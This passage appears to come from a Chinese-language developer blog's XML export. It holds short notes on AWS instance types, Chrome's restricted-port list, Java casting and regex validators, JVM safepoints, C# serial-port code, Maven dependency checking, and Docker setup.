<h3 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">M開頭型號-ex:m5</span><br><span class="line">一般用途的執行個體可平衡運算、記憶體與網路資源，也可用於各種工作負載。</span><br><span class="line">這些執行個體非常適合以相同比例使用這些資源的應用程式，如 Web 伺服器和程式碼儲存庫。</span><br><span class="line"></span><br><span class="line">R開頭型號-ex:r5 </span><br><span class="line">記憶體優化執行個體的設計目的，在於為記憶體內處理大型資料集的工作負載提供快速效能。</span><br><span class="line"></span><br><span class="line">T開頭型號-ex:t3</span><br><span class="line">T3 執行個體是新一代高載一般用途執行個體類型，可提供 CPU 基準效能與必要時隨時高載 CPU 用量的功能。</span><br><span class="line">T3 執行個體可在運算、記憶體和網路資源之間取得平衡，且針對 CPU 使用率適中，且使用中會出現短暫高峰的應用程式而設計。</span><br><span class="line"></span><br><span class="line">t系列開頭，通常會有credit的限制，在高流量分散式系統上不適合使用。</span><br><span class="line">m系列開頭，適合用在web server上</span><br><span class="line">r系列開頭，適合用在cache server，NoSQL or RDBMS。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>AWS</category>
      </categories>
      <tags>
        <tag>AWS</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro Chrome ERR_UNSAFE_PORT</title>
    <url>/posts/53c0f1e/</url>
    <content><![CDATA[<h2 id="Intro-Chrome-ERR-UNSAFE-PORT"><a href="#Intro-Chrome-ERR-UNSAFE-PORT" class="headerlink" title="Intro Chrome ERR_UNSAFE_PORT"></a>Intro Chrome ERR_UNSAFE_PORT</h2><span id="more"></span>
<p>這篇介紹Chrome ERR_UNSAFE_PORT。</p>
<h2 id="過程"><a href="#過程" class="headerlink" title="過程:"></a>過程:</h2><h2 id="在Chrome使用IP-Port連上網站時，會出現ERR-UNSAFE-PORT。這次是使用6666-Port才出現，經查詢後發現Chrome有定義一組黑名單Port如下"><a href="#在Chrome使用IP-Port連上網站時，會出現ERR-UNSAFE-PORT。這次是使用6666-Port才出現，經查詢後發現Chrome有定義一組黑名單Port如下" class="headerlink" title="在Chrome使用IP:Port連上網站時，會出現ERR_UNSAFE_PORT。這次是使用6666 Port才出現，經查詢後發現Chrome有定義一組黑名單Port如下:"></a>在Chrome使用IP:Port連上網站時，會出現ERR_UNSAFE_PORT。<br>這次是使用6666 Port才出現，經查詢後發現<br>Chrome有定義一組黑名單Port如下:</h2><p>const int kRestrictedPorts[] &#x3D; {<br>    1,      &#x2F;&#x2F; tcpmux<br>    7,      &#x2F;&#x2F; echo<br>    9,      &#x2F;&#x2F; discard<br>    11,     &#x2F;&#x2F; systat<br>    13,     &#x2F;&#x2F; daytime<br>    15,     &#x2F;&#x2F; netstat<br>    17,     &#x2F;&#x2F; qotd<br>    19,     &#x2F;&#x2F; chargen<br>    20,     &#x2F;&#x2F; ftp data<br>    21,     &#x2F;&#x2F; ftp access<br>    22,     &#x2F;&#x2F; ssh<br>    23,     &#x2F;&#x2F; telnet<br>    25,     &#x2F;&#x2F; smtp<br>    37,     &#x2F;&#x2F; time<br>    42,     &#x2F;&#x2F; name<br>    43,     &#x2F;&#x2F; nicname<br>    53,     &#x2F;&#x2F; domain<br>    69,     &#x2F;&#x2F; tftp<br>    77,     &#x2F;&#x2F; priv-rjs<br>    79,     &#x2F;&#x2F; finger<br>    87,     &#x2F;&#x2F; ttylink<br>    95,     &#x2F;&#x2F; supdup<br>    101,    &#x2F;&#x2F; hostriame<br>    102,    &#x2F;&#x2F; iso-tsap<br>    103,    &#x2F;&#x2F; gppitnp<br>    104,    &#x2F;&#x2F; acr-nema<br>    109,    &#x2F;&#x2F; pop2<br>    110,    &#x2F;&#x2F; pop3<br>    111,    &#x2F;&#x2F; sunrpc<br>    113,    &#x2F;&#x2F; auth<br>    115,    &#x2F;&#x2F; sftp<br>    117,    &#x2F;&#x2F; uucp-path<br>    119,    &#x2F;&#x2F; nntp<br>    123,    &#x2F;&#x2F; NTP<br>    135,    &#x2F;&#x2F; loc-srv &#x2F;epmap<br>    137,    &#x2F;&#x2F; netbios<br>    139,    &#x2F;&#x2F; netbios<br>    143,    &#x2F;&#x2F; imap2<br>    161,    &#x2F;&#x2F; snmp<br>    179,    &#x2F;&#x2F; BGP<br>    389,    &#x2F;&#x2F; ldap<br>    427,    &#x2F;&#x2F; SLP (Also used by Apple Filing Protocol)<br>    465,    &#x2F;&#x2F; smtp+ssl<br>    512,    &#x2F;&#x2F; print &#x2F; exec<br>    513,    &#x2F;&#x2F; login<br>    514,    &#x2F;&#x2F; shell<br>    515,    &#x2F;&#x2F; printer<br>    526,    &#x2F;&#x2F; tempo<br>    530,    &#x2F;&#x2F; courier<br>    531,    &#x2F;&#x2F; chat<br>    532,    &#x2F;&#x2F; netnews<br>    540,    &#x2F;&#x2F; uucp<br>    548,    &#x2F;&#x2F; AFP (Apple Filing Protocol)<br>    554,    &#x2F;&#x2F; rtsp<br>    556,    &#x2F;&#x2F; remotefs<br>    563,    &#x2F;&#x2F; nntp+ssl<br>    587,    &#x2F;&#x2F; smtp (rfc6409)<br>    601,    &#x2F;&#x2F; syslog-conn (rfc3195)<br>    636,    &#x2F;&#x2F; ldap+ssl<br>    989,    &#x2F;&#x2F; ftps-data<br>    990,    &#x2F;&#x2F; ftps<br>    993,    &#x2F;&#x2F; ldap+ssl<br>    995,    &#x2F;&#x2F; pop3+ssl<br>    1719,   &#x2F;&#x2F; h323gatestat<br>    1720,   &#x2F;&#x2F; h323hostcall<br>    1723,   &#x2F;&#x2F; pptp<br>    2049,   &#x2F;&#x2F; nfs<br>    3659,   &#x2F;&#x2F; apple-sasl &#x2F; PasswordServer<br>    4045,   &#x2F;&#x2F; lockd<br>    5060,   &#x2F;&#x2F; sip<br>    5061,   &#x2F;&#x2F; sips<br>    6000,   &#x2F;&#x2F; X11<br>    6566,   &#x2F;&#x2F; sane-port<br>    6665,   &#x2F;&#x2F; Alternate IRC [Apple addition]<br>    6666,   &#x2F;&#x2F; Alternate IRC [Apple addition]<br>    6667,   &#x2F;&#x2F; Standard IRC [Apple addition]<br>    6668,   &#x2F;&#x2F; Alternate IRC [Apple addition]<br>    6669,   &#x2F;&#x2F; Alternate IRC [Apple addition]<br>    6697,   &#x2F;&#x2F; IRC + TLS<br>    10080,  &#x2F;&#x2F; Amanda<br>};</p>
]]></content>
      <categories>
        <category>Chrome</category>
      </categories>
      <tags>
        <tag>Chrome</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro ClassCastException java.lang.Integer cannot be cast to java.lang.String</title>
    <url>/posts/4dc3b2f0/</url>
    <content><![CDATA[<h3 id="Intro-ClassCastException-java-lang-Integer-cannot-be-cast-to-java-lang-String"><a href="#Intro-ClassCastException-java-lang-Integer-cannot-be-cast-to-java-lang-String" class="headerlink" title="Intro ClassCastException java.lang.Integer cannot be cast to java.lang.String"></a>Intro ClassCastException java.lang.Integer cannot be cast to java.lang.String</h3><span id="more"></span>
<p>這篇介紹ClassCastException java.lang.Integer cannot be cast to java.lang.String。</p>
<h3 id="發生情境"><a href="#發生情境" class="headerlink" title="發生情境"></a>發生情境</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">從Elasticsearch撈欄位資料，將它轉型並塞至物件。</span><br><span class="line"></span><br><span class="line">example:</span><br><span class="line">xxx.setStatus(Integer.parseInt((String) hit.get(&quot;status&quot;)));</span><br><span class="line"></span><br><span class="line">在 (String) hit.get(<span class="string">&quot;status&quot;</span>) 這句會出現ClassCastException</span><br><span class="line"></span><br><span class="line">因為Integer和String是不同基礎型別的Object，不能直接cast</span><br></pre></td></tr></table></figure>

<h3 id="解決方法"><a href="#解決方法" class="headerlink" title="解決方法"></a>解決方法</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">xxx.setStatus(Integer.parseInt((String) hit.get(&quot;status&quot;))); </span><br><span class="line">改成 </span><br><span class="line">xxx.setStatus(Integer.parseInt(String.valueOf(hit.get(<span class="string">&quot;status&quot;</span>))));</span><br><span class="line">可避免轉型錯誤</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Cast</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro Collections UnmodifiableList</title>
    <url>/posts/daf15efb/</url>
    <content><![CDATA[<h3 id="Intro-Collections-UnmodifiableList"><a href="#Intro-Collections-UnmodifiableList" class="headerlink" title="Intro Collections UnmodifiableList"></a>Intro Collections UnmodifiableList</h3><span id="more"></span>
<p>這篇介紹Collections UnmodifiableList.</p>
<h3 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">如果要將list指定成只能讀，不能修改的話，要怎麼做呢?</span><br><span class="line">List&lt;Account&gt; list = Collections.unmodifiableList(resultList);</span><br><span class="line">若嘗試對list做寫入或修改時，會throw UnsupportedOperationException。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Collections</category>
      </categories>
      <tags>
        <tag>Collections</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro Cloudinary And How To Compress Images</title>
    <url>/posts/7fd294e2/</url>
    <content><![CDATA[<h3 id="Intro-Cloudinary-And-How-To-Compress-Images"><a href="#Intro-Cloudinary-And-How-To-Compress-Images" class="headerlink" title="Intro Cloudinary And How To Compress Images"></a>Intro Cloudinary And How To Compress Images</h3><span id="more"></span>
<p>這篇介紹Cloudinary And How To Compress Images。</p>
<h3 id="Cloudinary"><a href="#Cloudinary" class="headerlink" title="Cloudinary"></a>Cloudinary</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">網站:https://cloudinary.com/</span><br><span class="line">先註冊帳號密碼</span><br><span class="line">必須選擇Programmable Media <span class="keyword">for</span> image and Video API選項建立帳號才有Media Library功能</span><br><span class="line">登入後</span><br><span class="line">Media Library -&gt; 即可將圖片檔案丟上去變成網路空間的圖片</span><br><span class="line">圖片url範例:https://res.cloudinary.com/username/image/upload/xxx/aaa.jpg</span><br></pre></td></tr></table></figure>

<h3 id="How-To-Compress-Images"><a href="#How-To-Compress-Images" class="headerlink" title="How To Compress Images"></a>How To Compress Images</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">一般輸出的圖片是.jpg或.png</span><br><span class="line">目前分無損壓縮跟有損壓縮</span><br><span class="line">在網路上有很多工具可以先做第一次的圖片壓縮</span><br><span class="line">依照自己的需求做選擇</span><br><span class="line">通常可以壓縮20~50%的大小</span><br><span class="line">---</span><br><span class="line">在網站上有更好的圖片格式選擇可以取代.jpg或.png</span><br><span class="line">這邊介紹.webp格式</span><br><span class="line">網路上有很多工具可以從.jpg或.png轉檔成.webp</span><br><span class="line">再將.webp檔案丟上Cloudinary</span><br><span class="line">圖片url範例:https://res.cloudinary.com/username/image/upload/xxx/aaa.webp</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Cloudinary</category>
      </categories>
      <tags>
        <tag>Cloudinary</tag>
        <tag>Compress</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro Common Regex</title>
    <url>/posts/4603a256/</url>
    <content><![CDATA[<h3 id="Intro-Common-Regex"><a href="#Intro-Common-Regex" class="headerlink" title="Intro Common Regex"></a>Intro Common Regex</h3><span id="more"></span>
<p>這篇介紹Common Regex，它是正則表示式，針對參數做基本檢核(禁止非法字元)。</p>
<h3 id="Pattern-Example"><a href="#Pattern-Example" class="headerlink" title="Pattern Example"></a>Pattern Example</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">// UserId: 長度1 - 30 小寫英數混合，不允許特殊字元</span><br><span class="line">private static final Pattern userIdPattern = Pattern.compile(<span class="string">&quot;^[0-9a-z]&#123;1,30&#125;$&quot;</span>);</span><br><span class="line"></span><br><span class="line">// Password: 長度6 - 12 字元，only English and number</span><br><span class="line">private static final Pattern passwordPattern = Pattern.compile(<span class="string">&quot;^[0-9a-zA-Z]&#123;6,12&#125;$&quot;</span>);</span><br><span class="line"></span><br><span class="line">// Url: start-http:// or https://，不允許特殊字元</span><br><span class="line">private static final Pattern urlPattern = Pattern.compile(</span><br><span class="line">	<span class="string">&quot;^(http(s)?:\\/\\/)?(www.)?([a-zA-Z0-9])+([\\-\\.]&#123;1&#125;[a-zA-Z0-9]+)*\\.[a-zA-Z0-9]&#123;2,5&#125;(:[0-9]&#123;1,5&#125;)?(\\/[^\\s]*)?$&quot;</span>);</span><br><span class="line"></span><br><span class="line">// telegram chat_id : 長度 1 - 100字元，允許數字和-</span><br><span class="line">private static final Pattern telegramChatIdPattern = Pattern.compile(<span class="string">&quot;^[-0-9]&#123;1,100&#125;$&quot;</span>);</span><br><span class="line"></span><br><span class="line">// telegram token : 長度 1 - 200，允許英(大小寫)數字、(:)、(-)、(_)</span><br><span class="line">private static final Pattern telegramTokenPattern = Pattern.compile(<span class="string">&quot;^[0-9a-zA-Z:$-/_]&#123;1,200&#125;$&quot;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="Implementation-Example"><a href="#Implementation-Example" class="headerlink" title="Implementation Example"></a>Implementation Example</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">public static boolean isValidatedUserId(String value) &#123;</span><br><span class="line">	<span class="keyword">if</span> (isEmpty(value)) &#123;</span><br><span class="line">		<span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">return</span> isMatched(userIdPattern, value); //替換Pattern</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public static boolean isMatched(Pattern pattern, String value) &#123;</span><br><span class="line">	<span class="built_in">return</span> pattern.matcher(value).matches();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>regex</category>
      </categories>
      <tags>
        <tag>regex</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro Counted Loop Versus Uncounted Loop</title>
    <url>/posts/498bc6cf/</url>
    <content><![CDATA[<h3 id="Intro-Counted-Loop-Versus-Uncounted-Loop"><a href="#Intro-Counted-Loop-Versus-Uncounted-Loop" class="headerlink" title="Intro Counted Loop Versus Uncounted Loop"></a>Intro Counted Loop Versus Uncounted Loop</h3><span id="more"></span>
<p>這篇介紹Counted Loop Versus Uncounted Loop。</p>
<h3 id="Counted-Loop"><a href="#Counted-Loop" class="headerlink" title="Counted Loop"></a>Counted Loop</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">JVM認為比較短的<span class="keyword">for</span> loop，不會使用Safe Point。</span><br><span class="line">ex:用int當作index的<span class="keyword">for</span> loop</span><br></pre></td></tr></table></figure>

<h3 id="Uncounted-Loop"><a href="#Uncounted-Loop" class="headerlink" title="Uncounted Loop"></a>Uncounted Loop</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">JVM會在每次Loop <span class="built_in">return</span>之前放置Safe Point，ex:用long當作index的<span class="keyword">for</span> loop。</span><br><span class="line">所以一個常見的問題是當某個thread跑進了Counted loop時，JVM啟動了GC，</span><br><span class="line">需要等待這個thread把Loop跑完才能進入Safe Point，如果這個loop是個大loop，</span><br><span class="line">且loop內執行的比較慢，而且不存在其他函數調用產生其它Safe Point，</span><br><span class="line">這時就需要等待該thread跑完loop才能從其他位置進入Safepoint，</span><br><span class="line">這就導致了其它thread可能會長時間的Stop-the-world。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>JVM</category>
      </categories>
      <tags>
        <tag>JVM</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro C# Obsolete</title>
    <url>/posts/5948b9/</url>
    <content><![CDATA[<h3 id="Intro-C-Obsolete"><a href="#Intro-C-Obsolete" class="headerlink" title="Intro C# Obsolete"></a>Intro C# Obsolete</h3><span id="more"></span>
<p>Obsolete 屬性 (Attribute) 會標記不再建議使用的程式實體 (Entity)。<br>每次使用標記為過時的實體時，會視設定此屬性的方法，產生警告或是錯誤。</p>
<h3 id="Obsolete-String"><a href="#Obsolete-String" class="headerlink" title="Obsolete(String)"></a>Obsolete(String)</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">public class MyClass</span><br><span class="line">&#123;</span><br><span class="line">    [Obsolete(<span class="string">&quot;Don&#x27;t use Old Method!&quot;</span>)]</span><br><span class="line">    public static void ShowMessage(string msg)</span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine(msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">編譯時，系統會跳出警告，並顯示出警告提示「Dont<span class="string">&#x27; use Old Method!」。</span></span><br></pre></td></tr></table></figure>

<h3 id="Obsolete-String-true"><a href="#Obsolete-String-true" class="headerlink" title="Obsolete(String, true)"></a>Obsolete(String, true)</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">public class MyClass</span><br><span class="line">&#123;</span><br><span class="line">    [Obsolete(<span class="string">&quot;Don&#x27;t use Old Method!&quot;</span>, <span class="literal">true</span>)]</span><br><span class="line">    public static void ShowMessage(string msg)</span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine(msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">編譯時，系統會跳出錯誤，並顯示出錯誤提示「Dont<span class="string">&#x27; use Old Method!」。</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CSharp</category>
      </categories>
      <tags>
        <tag>Obsolete</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro Csharp RS232</title>
    <url>/posts/f7721619/</url>
    <content><![CDATA[<h2 id="Intro-Csharp-RS232"><a href="#Intro-Csharp-RS232" class="headerlink" title="Intro Csharp RS232"></a>Intro Csharp RS232</h2><span id="more"></span>
<p>這篇介紹透過RS232 Protocol對device做write和read操作。</p>
<h2 id="初始RS232連線"><a href="#初始RS232連線" class="headerlink" title="初始RS232連線:"></a>初始RS232連線:</h2><p>SerialPort serialPort &#x3D; new SerialPort();<br>public bool Init(int _comPort, BaudRateType baudRateType, ScanType scanType)<br>{<br>    comPort &#x3D; _comPort;<br>    try<br>    {<br>        var comportName &#x3D; string.Format(@”COM{0}”, comPort);<br>        if (serialPort !&#x3D; null &amp;&amp; serialPort.IsOpen)<br>        {<br>            serialPort.Close();<br>        }<br>        serialPort &#x3D; new SerialPort<br>        {<br>            PortName &#x3D; comportName<br>        };<br>        switch (baudRateType)<br>        {<br>            case BaudRateType.BaudRate9600:<br>                serialPort.BaudRate &#x3D; 9600;<br>                break;<br>            case BaudRateType.BaudRate19200:<br>                serialPort.BaudRate &#x3D; 19200;<br>                break;<br>            case BaudRateType.BaudRate38400:<br>                serialPort.BaudRate &#x3D; 38400;<br>                break;<br>            case BaudRateType.BaudRate57600:<br>                serialPort.BaudRate &#x3D; 57600;<br>                break;<br>            case BaudRateType.BaudRate115200:<br>                serialPort.BaudRate &#x3D; 115200;<br>                break;<br>            default:<br>                serialPort.BaudRate &#x3D; 19200;<br>                break;<br>        }<br>        serialPort.Parity &#x3D; Parity.None;<br>        serialPort.DataBits &#x3D; 8;<br>        serialPort.StopBits &#x3D; StopBits.One;<br>        serialPort.ReadBufferSize &#x3D; 1024;<br>        serialPort.WriteBufferSize &#x3D; 1024;</p>
<pre><code>    if (serialPort != null &amp;&amp; !serialPort.IsOpen)
    &#123;
        try
        &#123;
            serialPort.Open();
        &#125;
        catch (Exception ex)
        &#123;
            if (!MachineDataObj.IsTestAutoMode)
            &#123;
                LogUtil.logger.Error(Convert.ToString(ex));
            &#125;
            serialPort = null;
            return false;
        &#125;
    &#125;

    this.scanType = scanType;
    openCom = 1;
&#125;
catch (Exception ex)
&#123;
    TelegramBotType.FatalAndCallTelegram(Convert.ToString(ex));
&#125;
return true;
</code></pre>
<p>}</p>
<h2 id="Form-Load-初始設定"><a href="#Form-Load-初始設定" class="headerlink" title="Form_Load 初始設定:"></a>Form_Load 初始設定:</h2><p>serialPort.DataReceived +&#x3D; new SerialDataReceivedEventHandler(dataReceived);<br>&#x2F;&#x2F;default是false，需測試過才能使用<br>serialPort.DtrEnable &#x3D; true;<br>&#x2F;&#x2F;default是false，需測試過才能使用<br>serialPort.RtsEnable &#x3D; true;<br>serialPort.ReadTimeout &#x3D; 1000;</p>
<h2 id="Read-Data-via-RS232-Protocol"><a href="#Read-Data-via-RS232-Protocol" class="headerlink" title="Read Data via RS232 Protocol:"></a>Read Data via RS232 Protocol:</h2><p>private void dataReceived(object sender, SerialDataReceivedEventArgs e)<br>{<br>    if (serialPort.IsOpen)<br>    {<br>        DateTime dateTimeNow &#x3D; DateTime.Now;<br>        &#x2F;&#x2F;dateTimeNow.GetDateTimeFormats();<br>        textBoxReceive.Text +&#x3D; string.Format(“{0}\r\n”, dateTimeNow);<br>        &#x2F;&#x2F;dateTimeNow.GetDateTimeFormats(‘f’)[0].ToString() + “\r\n”;<br>        textBoxReceive.ForeColor &#x3D; Color.Red;</p>
<pre><code>    //ASCII
    if (radioButtonReceiveDataASCII.Checked == true) 
    &#123;
        try
        &#123;
            String input = serialPort.ReadLine();
            textBoxReceive.Text += input + &quot;\r\n&quot;;
            // save data to file
            if (saveDataFS != null)
            &#123;
                byte[] info = new UTF8Encoding(true).GetBytes(input + &quot;\r\n&quot;);
                saveDataFS.Write(info, 0, info.Length);
            &#125;
        &#125;
        catch(System.Exception ex)
        &#123;
            MessageBox.Show(ex.Message);
            return;
        &#125;
        
        textBoxReceive.SelectionStart = textBoxReceive.Text.Length;
        textBoxReceive.ScrollToCaret();
        serialPort.DiscardInBuffer(); 
    &#125;
    else //HEX
    &#123;
        try
        &#123;

            string input = serialPort.ReadLine();
            char[] values = input.ToCharArray();
            foreach (char letter in values)
            &#123;
                // Get the integral value of the character.
                int value = Convert.ToInt32(letter);
                // Convert the decimal value to a hexadecimal value in string form.
                string hexOutput = String.Format(&quot;&#123;0:X&#125;&quot;, value);
                textBoxReceive.AppendText(hexOutput + &quot; &quot;);
                textBoxReceive.SelectionStart = textBoxReceive.Text.Length;
                textBoxReceive.ScrollToCaret();
                //textBoxReceive.Text += hexOutput + &quot; &quot;;

            &#125;

            // save data to file
            if (saveDataFS != null)
            &#123;
                byte[] info = new UTF8Encoding(true).GetBytes(input + &quot;\r\n&quot;);
                saveDataFS.Write(info, 0, info.Length);
            &#125;


        &#125;
        catch(System.Exception ex)
        &#123;
            MessageBox.Show(ex.Message, &quot;Error&quot;);
            textBoxReceive.Text = &quot;&quot;;
        &#125;
    &#125;
&#125;
else
&#123;
    MessageBox.Show(&quot;Com error&quot;);
&#125;
</code></pre>
<p>}</p>
<h2 id="Write-Data-via-RS232-Protocol"><a href="#Write-Data-via-RS232-Protocol" class="headerlink" title="Write Data via RS232 Protocol:"></a>Write Data via RS232 Protocol:</h2><p>private void buttonSendData_Click(object sender, EventArgs e)<br>{<br>    if (!serialPort.IsOpen)<br>    {<br>        MessageBox.Show(“Open comPort”);<br>        return;<br>    }</p>
<pre><code>String strSend = textBoxSend.Text;
if (radioButtonSendDataASCII.Checked == true) //Send ASCII
&#123;
    serialPort.WriteLine(strSend);//发送一行数据 

&#125;
else
&#123;
    //Send 16進制用HEX
     
    char[] values = strSend.ToCharArray();
    foreach (char letter in values)
    &#123;
        // Get the integral value of the character.
        int value = Convert.ToInt32(letter);
        // Convert the decimal value to a hexadecimal value in string form.
        string hexIutput = String.Format(&quot;&#123;0:X&#125;&quot;, value);
        serialPort.WriteLine(hexIutput);

    &#125;
&#125;
</code></pre>
<p>}</p>
]]></content>
      <categories>
        <category>CSharp</category>
      </categories>
      <tags>
        <tag>RS232</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro Dependency Check Maven Tool</title>
    <url>/posts/e0b356/</url>
    <content><![CDATA[<h3 id="Intro-Dependency-Check-Maven-Tool"><a href="#Intro-Dependency-Check-Maven-Tool" class="headerlink" title="Intro Dependency Check Maven Tool"></a>Intro Dependency Check Maven Tool</h3><span id="more"></span>
<p>這篇介紹How to use dependency-check-maven。</p>
<h3 id="add-plugin"><a href="#add-plugin" class="headerlink" title="add plugin"></a>add plugin</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">&lt;plugin&gt;</span><br><span class="line">	&lt;groupId&gt;org.owasp&lt;/groupId&gt;</span><br><span class="line">	&lt;artifactId&gt;dependency-check-maven&lt;/artifactId&gt;</span><br><span class="line">	&lt;version&gt;7.3.0&lt;/version&gt;</span><br><span class="line">	&lt;executions&gt;</span><br><span class="line">		&lt;execution&gt;</span><br><span class="line">			&lt;goals&gt;</span><br><span class="line">				&lt;goal&gt;check&lt;/goal&gt;</span><br><span class="line">			&lt;/goals&gt;</span><br><span class="line">		&lt;/execution&gt;</span><br><span class="line">	&lt;/executions&gt;</span><br><span class="line">&lt;/plugin&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Maven-build"><a href="#Maven-build" class="headerlink" title="Maven build"></a>Maven build</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Goals : dependency-check:check</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Maven</category>
      </categories>
      <tags>
        <tag>Maven</tag>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro Curl 56 Recv Failure Connection Reset By Peer</title>
    <url>/posts/d9bdc5f0/</url>
    <content><![CDATA[<h3 id="Intro-curl-56-Recv-failure-Connection-reset-by-peer"><a href="#Intro-curl-56-Recv-failure-Connection-reset-by-peer" class="headerlink" title="Intro curl: (56) Recv failure: Connection reset by peer"></a>Intro curl: (56) Recv failure: Connection reset by peer</h3><span id="more"></span>
<p>這篇介紹curl: (56) Recv failure: Connection reset by peer。</p>
<h3 id="發生過程"><a href="#發生過程" class="headerlink" title="發生過程"></a>發生過程</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">在docker橋接模式</span><br><span class="line">使用host ping container 會出現</span><br><span class="line">curl: (56) Recv failure: Connection reset by peer 錯誤訊息。</span><br><span class="line">原因有可能是以下兩個地方的設定不一致造成，需檢查檔案</span><br><span class="line">docker compose port setting error</span><br><span class="line">server.xml port <span class="built_in">set</span> error</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
        <tag>Ping</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro Docker Compose Up Found Orphan</title>
    <url>/posts/3e1c1876/</url>
    <content><![CDATA[<h3 id="Intro-Docker-Compose-Up-Found-Orphan"><a href="#Intro-Docker-Compose-Up-Found-Orphan" class="headerlink" title="Intro Docker Compose Up Found Orphan"></a>Intro Docker Compose Up Found Orphan</h3><span id="more"></span>
<p>這篇介紹Docker Compose Up Found Orphan。</p>
<h3 id="發生情境"><a href="#發生情境" class="headerlink" title="發生情境"></a>發生情境</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">WARN[0000] Found orphan containers ([tomcat_1 tomcat_2 tomcat_3 tomcat_4 tomcat_5 tomcat_6 tomcat_7 </span><br><span class="line">tomcat_8 tomcat_9 tomcat_10]) <span class="keyword">for</span> this project.</span><br><span class="line">If you removed or renamed this service <span class="keyword">in</span> your compose file,</span><br><span class="line">you can run this <span class="built_in">command</span> with the --remove-orphans flag to clean it up.</span><br><span class="line"></span><br><span class="line">$ docker-compose up -d --remove-orphans</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>DockerCompose</category>
      </categories>
      <tags>
        <tag>Docker</tag>
        <tag>DockerCompose</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro Docker Build Image Pre-work</title>
    <url>/posts/9424e34a/</url>
    <content><![CDATA[<h3 id="Intro-Docker-Build-Image-Pre-work"><a href="#Intro-Docker-Build-Image-Pre-work" class="headerlink" title="Intro Docker Build Image Pre-work"></a>Intro Docker Build Image Pre-work</h3><span id="more"></span>
<p>這篇介紹Docker Build Image Pre-work。</p>
<h3 id="準備相關檔案路徑"><a href="#準備相關檔案路徑" class="headerlink" title="準備相關檔案路徑"></a>準備相關檔案路徑</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">製作目標環境: Rocky Linux 8 + tomcat 10.1.x + Jdk 17.0.x</span><br><span class="line">專案準備檔案目錄如下:</span><br><span class="line">&#123;dockerName&#125;</span><br><span class="line">	tomcat</span><br><span class="line">		bin</span><br><span class="line">			setenv.sh</span><br><span class="line">		conf</span><br><span class="line">			server.xml</span><br><span class="line">			tomcat-users.xml</span><br><span class="line">	Dockerfile</span><br><span class="line">	env.sh</span><br><span class="line">	run.sh</span><br><span class="line">	tomcat10.tar.gz</span><br><span class="line">	jdk17.tar.gz</span><br></pre></td></tr></table></figure>

<h3 id="Dockerfile-content"><a href="#Dockerfile-content" class="headerlink" title="Dockerfile content"></a>Dockerfile content</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">FROM rockylinux:8</span><br><span class="line">COPY jdk17.tar.gz tomcat10.tar.gz /</span><br><span class="line">ADD env.sh / run.sh /</span><br><span class="line">ENV JAVA_HOME=/java</span><br><span class="line">ENV PATH=<span class="variable">$JAVA_HOME</span>/bin:<span class="variable">$PATH</span></span><br><span class="line">RUN sh /run.sh </span><br><span class="line">ENTRYPOINT [<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;source /env.sh &amp;&amp; \&quot;<span class="variable">$@</span>\&quot;&quot;</span>, <span class="string">&quot;-s&quot;</span>]</span><br><span class="line">COPY tomcat /usr/local/tomcat</span><br><span class="line">CMD [ <span class="string">&quot;/usr/local/tomcat/bin/catalina.sh&quot;</span> , <span class="string">&quot;run&quot;</span> ]</span><br></pre></td></tr></table></figure>

